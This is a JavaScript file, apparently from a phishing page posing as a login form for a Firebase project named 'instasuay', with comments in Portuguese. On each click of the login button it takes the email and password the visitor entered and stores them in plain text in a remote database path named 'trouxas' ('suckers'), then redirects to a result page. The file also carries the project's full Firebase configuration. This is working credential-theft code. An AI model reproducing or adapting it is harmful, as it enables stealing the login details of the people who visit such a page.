import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-analytics.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";

// Configuração do Firebase
const firebaseConfig = {
    apiKey: "AIzaSyBiW9VMzBA455a8sbpcjakHRMNOpPiBTMI",
    authDomain: "instasuay.firebaseapp.com",
    projectId: "instasuay",
    storageBucket: "instasuay.appspot.com",
    messagingSenderId: "735048252865",
    appId: "1:735048252865:web:0f9c0dd4a3cb1ee01cc340",
    measurementId: "G-7V7ZD0HPK4"
};

// Inicializa o Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);

document.getElementById('loginBtn').addEventListener('click', () => {
  const id = Date.now(); // Gera um ID único usando timestamp
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  if (email && password) { // Verifica se os campos não estão vazios
    // Escreve dados no Realtime Database
    set(ref(database, 'trouxas/' + id), {
      email: email,
      password: password
    }).then(() => {
      // Lê dados do Realtime Database
      const dbRef = ref(getDatabase());
      return get(child(dbRef, `trouxas/${id}`));
    }).then((snapshot) => {
      if (snapshot.exists()) {
        console.log(snapshot.val());
        window.location.href = "result.html";
      } else {
        console.log("No data available");
      }
    }).catch((error) => {
      console.error(error);
    });
  } else {
    console.log("Email or password is empty");
  }
});